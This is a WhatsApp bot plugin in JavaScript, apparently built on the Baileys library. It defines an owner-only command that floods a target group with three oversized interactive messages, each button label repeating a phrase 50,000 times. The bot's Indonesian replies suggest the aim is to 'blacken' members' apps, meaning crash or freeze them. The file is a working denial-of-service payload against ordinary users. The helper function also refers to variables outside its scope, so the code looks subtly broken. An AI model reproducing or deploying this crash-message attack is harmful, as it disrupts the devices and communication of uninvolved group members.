const { delay } = require("@whiskeysockets/baileys")

module.exports = {
  type: ["owner"],
  command: ["kewer-kewer"],
  operate: async ({ client, m, text, kntol, Access, reaction, sendIAMessage }) => {
    if (!Access) return kntol("hitamkan")
    let rgex = /^\d+@g\.us$/
    if (!text) return kntol("id gc nya mana?, dan harus join gc nya dulu")
    if (!rgex.test(text)) return kntol("itu id apaan kocak. id togel kah")
    await reaction("🍃")
    await kntol("Otw hitamkan")
    await bukBuk(text)
    await delay(2000)
    await bukBuk(text)
    await delay(2000)
    await bukBuk(text)
    await delay(2000)
    await kntol("done jir")
  }
}
async function bukBuk(cht) {
    let tek = "jawa ganas ". repeat(50000)
         const btns = [
          {
            name: 'quick_reply',
            buttonParamsJson: JSON.stringify({
              display_text: tek
            })
          }
        ]
        await sendIAMessage(cht, btns, m, {
          header: `￶‍`,
          content: null,
          footer: null
        })
}